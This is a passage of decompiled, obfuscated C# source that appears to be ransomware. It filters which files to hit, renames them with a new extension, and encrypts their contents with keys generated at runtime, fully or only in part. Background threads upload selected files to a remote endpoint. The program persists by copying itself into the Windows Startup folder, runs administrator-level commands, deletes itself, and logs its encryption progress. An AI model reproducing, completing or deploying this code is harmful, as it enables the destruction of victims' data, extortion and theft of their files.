			if (!CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107389062)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107389549)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107389516)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389531)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389486)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107389493)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107389472)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389459)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389414)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389409)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389400)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389351)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389325)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107389336)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388799)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388750)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388765)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388716)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388731)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388682)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388697)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388648)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388667)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388614)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107388633)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107388588)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107388603)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().Contains(getString_0(107388554)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(ZvzUuZdcuZvZyuA(getString_0(107388569))) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107389056)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107397084)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107389043)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(ultCKTLdBIeqJ) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(getString_0(107389018)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(getString_0(107389013)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(getString_0(107388976)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(getString_0(107388971)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(getString_0(107388966)) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(hdtcmoyGEV) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(knClGxGTQzcKgW) && !CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.Contains(WkbYpntLeHaVcf))
			{
				if (omzlEvaIgXI.Length != 0)
				{
					string[] array = omzlEvaIgXI;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1094;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.EndsWith(ultCKTLdBIeqJ))
					{
						goto IL_1094;
					}
				}
				catch (Exception)
				{
					goto IL_1094;
				}
				if (!bTWTPdqAFFpauU.Contains(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv))
				{
					if (JvLbPnAiNtPFl == getString_0(107396834))
					{
						try
						{
							if (xNneCkeMZRvxQg.rdTUqItxjMreSCf(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv))
							{
								xNneCkeMZRvxQg.IliDSuvIRJoA(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
							}
						}
						catch
						{
						}
					}
					bTWTPdqAFFpauU.Add(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (hdAepnrmnch)
							{
								Console.WriteLine(wIiqciEKsSgyz.getString_0(107402491) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + wIiqciEKsSgyz.getString_0(107402900) + new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length + wIiqciEKsSgyz.getString_0(107402911));
								Console.WriteLine(wIiqciEKsSgyz.getString_0(107402498), bTWTPdqAFFpauU.Count, ZxYqzVUoLKX, bBKKzTBaLJVhdj);
								Console.WriteLine(wIiqciEKsSgyz.getString_0(107402441), iprsjxEHICCj.Elapsed);
								Console.WriteLine(wIiqciEKsSgyz.getString_0(107403382));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!cVxpfEOwEmPC.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv)))
					{
						cVxpfEOwEmPC.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv));
					}
					DnuJfeBIbLhr(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
					try
					{
						new NTQxrgSdsWceAc().mAZxWbHOwVEf(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (hdAepnrmnch)
								{
									Console.WriteLine(getString_0(107402967) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107402890) + new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length + getString_0(107402901));
									Console.WriteLine(getString_0(107403372));
								}
							}
							catch
							{
							}
							mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107403267)), getString_0(107388914) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107388914) + ZvzUuZdcuZvZyuA(getString_0(107403242)) + getString_0(107388914) + Environment.UserName + getString_0(107388914) + ZvzUuZdcuZvZyuA(getString_0(107403257)));
						}
					}
					catch (Exception ex2)
					{
						if (MvyzXvhzMsIEWT)
						{
							try
							{
								File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107403232) + ex2.Message + getString_0(107395942));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length != 0L)
							{
								goto end_IL_0887;
							}
							goto end_IL_0887_2;
							end_IL_0887:;
						}
						catch (Exception ex4)
						{
							if (MvyzXvhzMsIEWT)
							{
								try
								{
									File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107402607) + ex4.Message + getString_0(107395942));
								}
								catch (Exception)
								{
								}
							}
							bBKKzTBaLJVhdj++;
							goto end_IL_0887_2;
						}
						if (AjDKbvSruxge == getString_0(107396834) && new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length > Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024)
						{
							try
							{
								if (ultCKTLdBIeqJ != getString_0(107386551))
								{
									if (mYYMBtfmlAOyF)
									{
										ultCKTLdBIeqJ = zmgIWyNctPwjW + ultCKTLdBIeqJ;
									}
									File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ);
								}
							}
							catch (Exception ex6)
							{
								if (MvyzXvhzMsIEWT)
								{
									try
									{
										File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107402578) + ex6.Message + getString_0(107395942));
									}
									catch (Exception)
									{
									}
								}
								bBKKzTBaLJVhdj++;
								return;
							}
							if (ultCKTLdBIeqJ != getString_0(107386551))
							{
								CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv += ultCKTLdBIeqJ;
							}
							if (FGSbbxnupor == getString_0(107396834))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item in SkvTXsJINBztMRD)
									{
										if (CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.KkLhvrADszGGi.ultCKTLdBIeqJ) && eiZgJNzJZhH == wIiqciEKsSgyz.getString_0(107396844))
										{
											if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv).Length)
											{
												try
												{
													PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(wIiqciEKsSgyz.getString_0(107389729), wIiqciEKsSgyz.getString_0(107389724), wIiqciEKsSgyz.getString_0(107389679), CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv.ToLower().EndsWith(item) && eiZgJNzJZhH == wIiqciEKsSgyz.getString_0(107396410))
										{
											try
											{
												PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(wIiqciEKsSgyz.getString_0(107389729), wIiqciEKsSgyz.getString_0(107389724), wIiqciEKsSgyz.getString_0(107389679), CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							string text = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
							string text2 = getString_0(107389606);
							text2 = (dludHStvHyTu ? COHaNSLBjuDxHFZgW.POLqBalRuwH() : getString_0(107389606));
							string s = wAtanfYbhauOuKP.MvqOeoNjtEKI(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (IiqKblfhNFuY == getString_0(107396400))
							{
								byte[] array2 = null;
								byte[] byte_ = hLhUwUDAhWMjzuB.DfGjgEHjZJUE(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, Convert.ToInt32(vmbpzaFVaVU) * 1024 * 1024);
								if (!hLhUwUDAhWMjzuB.LDXgNdvfAheSqfs(yTrxIKISCfGp: (!CcJcTYoshtYbPYb) ? (dludHStvHyTu ? hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hLhUwUDAhWMjzuB.kRJzGPxkoWlQg(byte_, Convert.FromBase64String(MmaHtQgyFtb), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dludHStvHyTu ? DlKGxPgDEDy.AxAOLtoppUjMDv(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : DlKGxPgDEDy.AxAOLtoppUjMDv(byte_, Convert.FromBase64String(MmaHtQgyFtb), Convert.FromBase64String(zSiinLyeiNOaQic))), KyClZYkMZEgn: CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, xPcAnAVJYVtBl: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!dludHStvHyTu)
							{
								if (!UBFsZsHuzIVCuyiH.HAYNDKhQUXPc(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, vmbpzaFVaVU, MmaHtQgyFtb, null, Convert.FromBase64String(zSiinLyeiNOaQic)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!UBFsZsHuzIVCuyiH.HAYNDKhQUXPc(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, vmbpzaFVaVU, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (mYYMBtfmlAOyF)
							{
								ultCKTLdBIeqJ = zmgIWyNctPwjW + ultCKTLdBIeqJ;
							}
							string text3 = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
							string text4 = getString_0(107389606);
							text4 = (dludHStvHyTu ? COHaNSLBjuDxHFZgW.POLqBalRuwH() : getString_0(107389606));
							string s2 = wAtanfYbhauOuKP.MvqOeoNjtEKI(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (ultCKTLdBIeqJ != getString_0(107386551))
							{
								if (!kIbCIqqAMtB)
								{
									if (!dludHStvHyTu)
									{
										FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, INlpeyNXGAcMRYsht);
									}
									else
									{
										FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!dludHStvHyTu)
										{
											EPFgKsSOzMWL(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, INlpeyNXGAcMRYsht, Convert.FromBase64String(zSiinLyeiNOaQic));
										}
										else
										{
											EPFgKsSOzMWL(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (MvyzXvhzMsIEWT)
										{
											try
											{
												File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107386505) + ex11.Message + getString_0(107395942));
											}
											catch (Exception)
											{
											}
										}
										bBKKzTBaLJVhdj++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!kIbCIqqAMtB)
							{
								if (!dludHStvHyTu)
								{
									FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107386546), INlpeyNXGAcMRYsht);
								}
								else
								{
									FzWLEbFhnFTpMlZv(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107386546), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!dludHStvHyTu)
									{
										EPFgKsSOzMWL(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, INlpeyNXGAcMRYsht, Convert.FromBase64String(zSiinLyeiNOaQic));
									}
									else
									{
										EPFgKsSOzMWL(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (MvyzXvhzMsIEWT)
									{
										try
										{
											File.AppendAllText(knClGxGTQzcKgW, getString_0(107387323) + CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + getString_0(107386505) + ex14.Message + getString_0(107395942));
										}
										catch (Exception)
										{
										}
									}
									bBKKzTBaLJVhdj++;
									return;
								}
							}
							if (dludHStvHyTu)
							{
								if (ultCKTLdBIeqJ != getString_0(107386551))
								{
									sgeKhRYEDh(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv + ultCKTLdBIeqJ, bytes2);
								}
								else
								{
									sgeKhRYEDh(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv, bytes2);
								}
							}
						}
						end_IL_0887_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1094;
			IL_1094:
			RXnxbMGGkHM.Remove(CS_0024_003C_003E8__locals0.DVZJRBcuvHJNv);
		}

		static NxpTIMrohu()
		{
			Strings.CreateGetStringDelegate(typeof(NxpTIMrohu));
		}
	}

	private sealed class OkjrUMihyzSdFX
	{
		public string yHbNFRqzsT;

		public string leVGelzJXgDBP;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(yHbNFRqzsT);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(leVGelzJXgDBP))
					{
						File.Delete(leVGelzJXgDBP);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string ZpbuHbHegKdPsO;

	public static byte[] INlpeyNXGAcMRYsht;

	public static string SUzteLfaPqYT;

	public static string rMzUuGRFsemZwV;

	public static List<string> YyCNsMjoVMOoP;

	public static List<string> gPUoUjIToplZ;

	public static string BaTKDxNHIDbb;

	public static string MmaHtQgyFtb;

	public static string zSiinLyeiNOaQic;

	public static string VDLcytKbuzTj;

	public static string HIjpsGdeVCfV;

	public static int wejmwyoQVQUQsU;

	public static string JvLbPnAiNtPFl;

	public static string nsKpUomFAcOz;

	public static string EJPsucdpqfblt;

	public static string BmkGyDPnrHxxK;

	public static string vIxYDZmliTLs;

	public static string hMPfQknjOSgM;

	public static string ffTDkqEJLu;

	public static string PfamhYYvOLt;

	public static List<string> juXcZmnrdh;

	public static List<string> cVxpfEOwEmPC;

	public static string NYUHoHeNgYqe;

	public static string PJcFDYQtveZrI;

	public static string jLBsOBsltOMag;

	public static List<string> bTWTPdqAFFpauU;

	public static string VXFFPDYcDmttpVY;

	private static string xUYAQkrpKik;

	public static string AaFKnZpVmxll;

	public static string qynsOdMypTOYNli;

	public static List<string> uKyEStecyhCJqa;

	public static List<string> cuNspBLQnaiUg;

	public static List<string> zDWpxjRkhE;

	public static List<string> jWqPIVGpjkE;

	public static string oUJkScAGYiOuk;

	public static List<string> MszUcjKHBHsCixH;

	public static List<string> wJRTZLiIcovO;

	public static string qdHREpNAkxovuyp;

	public static string qCqrcjMgIH;

	internal static DateTime fgeLRZJmOwKtpeQ;

	internal static DateTime zKUkTflbfxFJgb;

	public static string AjDKbvSruxge;

	public static string vmbpzaFVaVU;

	public static string DoejNTXBreRUtu;

	public static string yZhHOqBFjgJAALJ;

	public static string pNwCRAugOpbK;

	public static string nPCmRKlbctnEy;

	public static string UyxUbeNFsOiz;

	public static string FGSbbxnupor;

	public static List<string> SkvTXsJINBztMRD;

	public static string eiZgJNzJZhH;

	public static string QBNkovNHjRPLm;

	public static string PbLrAHudJtI;

	public static string NsXmyOpOsw;

	public static string QbbecTAQBWOQL;

	public static string iLUZulQmned;

	public static string fmaLHmxxTwZD;

	public static string peHZbsiUHe;

	public static string yrnseMuKTJXN;

	public static string vxtPpKhCdVI;

	public static string HadOpfWYYmVK;

	public static string XOepnAmRVy;

	public static string xUjiDYXnYV;

	public static string eCuVMSxuue;

	public static string DtTyjpOYkwPmOK;

	public static string mZgbiGZHholE;

	public static string OhgfYyCwZIzrk;

	public static string PTZajYvtKdl;

	public static string nXbCZlCuvFql;

	public static string hdtcmoyGEV;

	public static string oAHTjawhYVeZf;

	public static string MnvGgRhyVj;

	public static string nVMXzpSiOWw;

	public static string wIBBVlTRMlGJsj;

	public static string HRRvwQDpth;

	public static string WOzPZCKnrUtVm;

	public static string IiqKblfhNFuY;

	public static string PfvUWLRmLLJxJfuB;

	public static string LsSyLAcPVPjhbnX;

	public static string[] yURxqNIzRnSLu;

	public static string uEKpoPMiNFZ;

	public static bool CcJcTYoshtYbPYb;

	public static string GUROFNYdsapXwV;

	public static bool dludHStvHyTu;

	public static bool siUmudLEnyH;

	public static bool bdKOcjKUUjHwlc;

	public static bool qyQHkbOmTCffuf;

	public static string knClGxGTQzcKgW;

	public static bool MvyzXvhzMsIEWT;

	public static bool gZUmygLlxNNdJl;

	public static bool pcwRfMRGnwC;

	public static bool YMNrvxnhNxvEzz;

	public static bool kIbCIqqAMtB;

	public static string WkbYpntLeHaVcf;

	public static bool hdAepnrmnch;

	public static Stopwatch iprsjxEHICCj;

	public static int bBKKzTBaLJVhdj;

	public static int ZxYqzVUoLKX;

	public static bool mYYMBtfmlAOyF;

	public static string zmgIWyNctPwjW;

	public static string[] WxFKBJOglGuZ;

	public static List<string> rvGughPBDES;

	public static int FBFvSEsTvDQJXR;

	public static bool kwNUHYKFODh;

	public static bool MGTkXQOIDkk;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			OmpDEIrizJ CS_0024_003C_003E8__locals0 = new OmpDEIrizJ();
			CS_0024_003C_003E8__locals0.ZYwGptWlIh = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.ZYwGptWlIh) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			YjgqCcnqPDdl.BqcpUEBmaOqw(xUYAQkrpKik);
		}
		catch (Exception)
		{
		}
		try
		{
			if (WOzPZCKnrUtVm == getString_0(107396816))
			{
				Thread thread = new Thread(IgNGEbPltBXjBz.zRIGdloctOsByH);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (EJPsucdpqfblt == getString_0(107396816))
		{
			Thread.Sleep(int.Parse(BmkGyDPnrHxxK));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && UyxUbeNFsOiz == getString_0(107396816))
		{
			try
			{
				uVVdsjGVrGks(ZvzUuZdcuZvZyuA(getString_0(107396843)));
			}
			catch
			{
			}
		}
		try
		{
			if (ffTDkqEJLu == getString_0(107396816) && EfNfUXRxtQFCsKUl.veKyMGGldEuaEz())
			{
				new rFZKrGPQZNF().JklKvMEQvelA(bool_0: false);
				EfNfUXRxtQFCsKUl.qPyfHDwBGPXLqP();
			}
		}
		catch (Exception)
		{
		}
		if (PJcFDYQtveZrI == getString_0(107396816) && EfNfUXRxtQFCsKUl.veKyMGGldEuaEz())
		{
			new rFZKrGPQZNF().JklKvMEQvelA(bool_0: false);
			new rFZKrGPQZNF().WGVAzUNVXjV();
		}
		if (nsKpUomFAcOz == getString_0(107396816))
		{
			dzwuljRLFul.BZhMujxYrOry();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396738);
			string text2 = text + Path.GetFileName(fileName);
			if (HIjpsGdeVCfV == getString_0(107396816) && fileName != text2)
			{
				Thread thread2 = new Thread(aHAXSlbacvoez);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (BaTKDxNHIDbb == getString_0(107396816) && mainModule != null && fileName != text2)
			{
				try
				{
					wejmwyoQVQUQsU = iZewdCSMqysZRm(0, juXcZmnrdh.Count);
					File.Copy(fileName, text + juXcZmnrdh[wejmwyoQVQUQsU], overwrite: true);
					Process.Start(text + juXcZmnrdh[wejmwyoQVQUQsU]);
					yExfGaYYDORBn();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (qdHREpNAkxovuyp == getString_0(107396816) && DateTime.Now < fgeLRZJmOwKtpeQ)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (qCqrcjMgIH == getString_0(107396816) && DateTime.Now > zKUkTflbfxFJgb)
			{
				yExfGaYYDORBn();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107397213);
			if (xUjiDYXnYV == getString_0(107396816))
			{
				Console.WriteLine(getString_0(107397075));
			}
			iprsjxEHICCj.Start();
		}
		catch
		{
		}
		FUFyRGutBoJe();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = cuNspBLQnaiUg;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386978)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> source2 = zDWpxjRkhE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386933)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (LsSyLAcPVPjhbnX == getString_0(107396816))
				{
					string[] source3 = yURxqNIzRnSLu;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386933)), getString_0(107386908) + string_0 + getString_0(107386899));
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!ykfhcMmkJbZl().Contains(getString_0(107386659)))
				{
					mDTyZTitOnZ(oUJkScAGYiOuk);
				}
				else
				{
					List<string> source4 = jWqPIVGpjkE;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							mFLmLCPYHuB(ZvzUuZdcuZvZyuA(gZenGKRaZbbcTPvN(getString_0(107386926))), string_0);
						};
					}
					Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> mszUcjKHBHsCixH = MszUcjKHBHsCixH;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386869)), string_0);
					};
				}
				Parallel.ForEach(mszUcjKHBHsCixH, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397066))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397066)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397017)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
